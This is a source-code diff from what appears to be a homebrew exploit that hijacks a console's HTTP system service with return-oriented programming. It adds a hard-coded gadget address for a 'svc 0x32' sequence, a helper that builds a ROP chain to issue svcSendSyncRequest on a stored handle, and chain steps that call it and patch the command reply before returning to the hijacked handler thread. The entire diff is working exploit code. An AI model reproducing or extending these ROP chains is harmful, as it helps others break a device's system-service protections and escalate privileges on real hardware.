@@ -64,6 +64,9 @@ u32 ROP_strncpy = 0x0010dc88;
 u32 ROP_memcpy = 0x0010d274;
 u32 ROP_strlen = 0x0010f848;
 u32 ROP_svcControlMemory = 0x00100770;
+
+u32 ROP_svc32 = 0x00100cbc;//"ldr r0, [r0]" "svc 0x00000032" <check if r0 is positive via r1, then r0=cmdreply resultcode if so> "pop {r4, pc}"
+
 u32 ROP_CreateContext = 0x0011689c;//This is the actual CreateContext function called via the *(obj+16) vtable. inr0=_this inr1=urlbuf* inr2=urlbufsize inr3=u8 requestmethod insp0=u32* out contexthandle
 u32 ROP_HTTPC_CMDHANDLER_CreateContext = 0x00114b4c;//This is the start of the code in the httpc_cmdhandler which handles the CreateContext cmd, starting with "ldr r7, =<cmdhdr>".
 u32 ROP_HTTPC_CMDHANDLER_AddRequestHeader = 0x00114f40;//Same as ROP_HTTPC_CMDHANDLER_CreateContext except for AddRequestHeader.
@@ -372,6 +375,16 @@ void ropgen_sharedmem_create(u32 **ropchain, u32 *http_ropvaddr, u32 ctx, u32 ad
 	params[4] = otherpermission;
 
 	ropgen_callfunc(ropchain, http_ropvaddr, ROP_sharedmem_create, params);
+}
+
+void ropgen_svcSendSyncRequest(u32 **ropchain, u32 *http_ropvaddr, u32 handle_addr)
+{
+	ropgen_copyu32(ropchain, http_ropvaddr, ropheap+0x0, (*http_ropvaddr) + 0x40 + 0x4, 0x3);//Copy the cmdbuf ptr to the r4 value used below with ropgen_setr4.
+	ropgen_setr4(ropchain, http_ropvaddr, 0);
+
+	ropgen_setr0(ropchain, http_ropvaddr, handle_addr);
+	ropgen_addword(ropchain, http_ropvaddr, ROP_svc32);
+	ropgen_addword(ropchain, http_ropvaddr, 0);//r4
 }
 
 void ropgen_ret2cmdhandler(u32 **ropchain, u32 *http_ropvaddr)
@@ -887,6 +900,7 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 
 	u32 curent = ropheap+0x3c;
 	u32 ropentry_type = ropheap+0x44;
+	u32 customcmdhandler_handlestorage = ropheap+0x70;
 
 	u32 customcmdhandler_roplaunch_savedregs_addr=0;
 
@@ -1279,6 +1293,16 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);//cmdreply[1] = 0xd900182f;
 	ropgen_movr1r0(&ropchain, &ropvaddr);
 	ropgen_writeu32(&ropchain, &ropvaddr, 0xd900182f, 0, 0);
+
+	ropgen_svcSendSyncRequest(&ropchain, &ropvaddr, customcmdhandler_handlestorage);
+
+	//Just in case the svc itself fails, write r0 to cmdreply[1].
+	ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20 + 0x20 + 0x2c + 0x4, 1);
+
+	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);
+	ropgen_movr1r0(&ropchain, &ropvaddr);
+	ropgen_setr0(&ropchain, &ropvaddr, 0);
+	ropgen_strr0r1(&ropchain, &ropvaddr, 0, 0);
 
 	//Setup the ROP used for returning to the actual cmdhandler thread code.
 	ropgen_writeu32(&ropchain, &ropvaddr, ROP_POP_R4R5R6R7R8R9SLFPIPPC, __httpmainthread_handlerfunc_stackframe-0x28-4, 1);//When doing the stack-pivot, it will jump to ROP_POP_R4R5R6R7R8R9SLFPIPPC for pc with this.
